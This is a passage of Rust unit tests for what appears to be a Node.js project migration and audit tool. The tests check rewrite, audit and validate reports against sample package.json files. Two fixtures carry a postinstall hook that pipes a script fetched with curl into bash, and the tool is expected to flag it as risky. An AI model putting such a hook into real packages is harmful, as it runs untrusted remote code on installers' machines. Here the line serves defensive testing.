        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_rewrite(project, false).expect("rewrite report");
        assert!(
            report
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::ManualScriptReview)
        );
        assert!(report.manual_review_items >= 1);
    }

    #[test]
    fn run_audit_classifies_missing_node_engine_under_runtime() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_audit(project).expect("audit should succeed");
        let finding = report
            .findings
            .iter()
            .find(|finding| {
                finding.path.as_deref() == Some("package.json")
                    && finding.message.contains("missing engines.node")
            })
            .expect("missing engines finding");

        assert_eq!(finding.category, MigrationCategory::Runtime);
        assert_eq!(finding.severity, MigrationSeverity::Low);
    }

    #[test]
    fn run_validate_fails_without_lockfile_and_with_risky_scripts() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_validate(project).expect("validate report");
        assert!(!report.is_pass());
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-002" && !check.passed)
        );
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-003" && !check.passed)
        );
    }

    #[test]
    fn run_validate_passes_for_hardened_project() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"test":"node test.js"}
            }"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_validate(project).expect("validate report");
        assert!(report.is_pass());
        assert!(report.blocking_findings.is_empty());
        assert!(report.checks.iter().all(|check| check.passed));
    }
}
